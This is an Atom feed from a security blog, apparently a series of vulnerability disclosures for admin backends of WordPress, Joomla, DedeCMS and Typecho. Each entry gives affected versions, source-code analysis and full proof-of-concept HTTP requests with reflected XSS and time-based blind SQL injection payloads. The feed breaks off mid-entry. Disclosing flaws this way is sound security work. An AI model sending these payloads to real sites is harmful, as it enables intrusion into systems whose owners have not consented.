<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shadow Gallery</title>
  
  <subtitle>Live in the shadow</subtitle>
  <link href="https://srpopty.github.io/atom.xml" rel="self"/>
  
  <link href="https://srpopty.github.io/"/>
  <updated>2023-02-27T08:19:35.000Z</updated>
  <id>https://srpopty.github.io/</id>
  
  <author>
    <name>Srpopty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WordPress V6.2 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/"/>
    <id>https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/</id>
    <published>2023-02-27T08:19:35.000Z</published>
    <updated>2023-02-27T08:19:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend theme file editor component with reflected-XSS via POST parameter <code>newcontent</code> when the POST parameter <code>theme</code> does not exist.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>WordPress &lt;= 6.2</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin background management, editing a theme file in theme file editor component.</li><li>POST to <code>/wp-admin/theme-editor.php</code> with the right wordpress nonce, as well as the <code>newcontent</code> parameter which contains the XSS payload, e.g. <code>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!--</code>, remove the <code>theme</code> parameter at the same time.</li></ol><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/2.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/3.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/4.png"></p><p>In source code of <code>/wp-admin/theme-editor.php</code>, at line 125, the <code>newcontent</code> passes to <code>$post_content</code>, but <code>wp_unslash</code> does not filter any XSS payload.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/5.png"></p><p>At line 129, <code>$post_content</code> passes to <code>$content</code>, and at line 291, the <code>$content</code> is directly echoed to html.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/6.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/7.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/wordpress/wp-admin/theme-editor.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.10</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/wordpress/wp-admin/theme-editor.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Caf4d97cb01e4752e872af6fc5226c89263904830dda087656dbbd0fa79fcf29a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Ce2441da59527b55b9831572be4c5a5955c9acb44a4d72e2477feabfbb4efba21; wp-settings-time-1=1677480056; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">nonce<span class="operator">=</span>f<span class="number">8</span>bc<span class="number">8439</span>a<span class="number">1</span>&amp;_wp_http_referer<span class="operator">=</span><span class="variable">%2</span>Fcms<span class="variable">%2</span>Fwordpress<span class="variable">%2</span>Fwp-admin<span class="variable">%2</span>Ftheme-editor.php&amp;newcontent<span class="operator">=</span>&lt;/textarea&gt;&lt;img<span class="variable">%20</span>src<span class="operator">=</span><span class="keyword">x</span><span class="variable">%20</span>onerror<span class="operator">=</span>alert(<span class="number">1</span>)&gt;&lt;<span class="title">!--</span>&amp;action<span class="operator">=</span>update&amp;file<span class="operator">=</span>style.css&amp;themexxx<span class="operator">=</span>twentytwentythree</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">WordPress-V6.2 with Reflected-XSS in backend /wp-admin/theme-editor.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Joomla V4.2.8 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/"/>
    <id>https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/</id>
    <published>2023-02-27T07:24:16.000Z</published>
    <updated>2023-02-27T07:24:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend Multi-factor Authentication component with reflected-XSS via base64-encoded GET parameters <code>returnurl</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Joomla &lt;= 4.2.8</p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to Joomla CMS admin backend management, enter into the Multi-factor Authentication component.</li><li>No matter add a new or edit an existed multi-factor authentication method, there is always a base64-encoded URL parameter <code>returnurl</code>.</li><li>The value of <code>returnurl</code> will be decoded by base64 and appeared in html attribute <code>href</code> of <code>&lt;a&gt;</code> tag, which in the “Save &amp; Close” and “Cancel” button.</li><li>Change the value of <code>returnurl</code> to base64-encoded XSS payload, e.g. <code>amF2YXNjcmlwdDphbGVydCgxKTs=</code>, which is the <code>javascript: alert(1)</code>, and request the page with <code>returnurl</code> parameter, the payload will be injected to the “href”.</li></ol><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/2.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/3.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/4.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/5.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/joomla/administrator/index.php?option=com_users&amp;task=method.add&amp;method=yubikey&amp;user_id=220&amp;returnurl=amF2YXNjcmlwdDphbGVydCgxKTs%3D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>atumSidebarState=open; 8bf89f010a5bbff54669e4ad47111f59=8nunecujukuvngvnu63fptrr0t; c04ce7edc2a8825a69f250555054fe73=ujj34jaqqm0md1cihnph0q3a20; PHPSESSID=enl8bvb5tmdfidt9kmvvekicr7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Joomla-V4.2.8 with Reflected-XSS in backend /administrator/index.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend group store blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/group_store.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>In the source code of <code>/dede/group_store.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/group_store.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fgroup_store.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/group_store.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend story catalog blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/story_catalog.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>Requires <code>PHP ≤ 5</code> and <code>MySQL ≤ 5.5</code>, and the story component contains at least one record in database.</li><li>In the source code of <code>/dede/story_catalog.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/story_catalog.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fstory_books.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/story_catalog.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/"/>
    <id>https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/</id>
    <published>2023-02-26T14:47:13.000Z</published>
    <updated>2023-02-26T14:47:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend image file upload with reflected-XSS in uploaded filename.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>In <code>/dede/upload.php</code>, upload an new image file named “file”, with the filename contains XSS payload, e.g. <code>&lt;img src=x onerror=alert(1)&gt;.png</code>.</li><li>The uploaded filename must ends with a normal image extension, e.g. <code>.png</code> or <code>.jpeg</code>, and the file content must contains the legal image file header, filename should not contains and <code>/</code> or <code>\</code>.</li><li>The response of <code>/dede/upload.php</code> contains the XSS payload with the <code>text/html</code> content-type.</li></ol><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/2.png"></p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/3.png"></p><p>In source code, the filename is directly passed through the <code>pathinfo</code> function and assigned to <code>$res[&#39;remark&#39;]</code>, and finally echoed json encoded array, which contains the XSS payload, and by default, the response content-type is <code>text/html</code>.</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/4.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>317</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8dr4oJI5ByNkMbkK</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C4_1%2C5_1%2C6_1%2C2_1%2C3_1; PHPSESSID=n5ibb5j70gj24qh8alr61u6ov2; _csrf_name_1d27e3c9=426b27a62d00e1341c13019bf34f4d05; _csrf_name_1d27e3c91BH21ANI1AGD297L1FF21LN02BGE1DNG=6e24882e1c219de6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=c7079a345e8c8682; DedeLoginTime=1677347766; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8163b03f86d69dc6; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fcontent_i_list.php%3Fchannelid%3D2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK</span></span><br><span class="line"><span class="language-mel">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;.png&quot;</span></span></span><br><span class="line"><span class="language-mel">Content-Type: <span class="keyword">image</span>/png</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">PNG</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">IHDR(-SPLTEà<span class="number">22</span>ßÿêé]³ôß&amp;&amp;<span class="number">1</span>%dIDATc<span class="string">``</span><span class="string">`dbfaec@,¶hQGÜYIEND®B`</span></span></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK--</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Reflected Cross-Site Scripting in backend /dede/upload.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T12:12:27.000Z</published>
    <updated>2023-02-21T12:12:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img 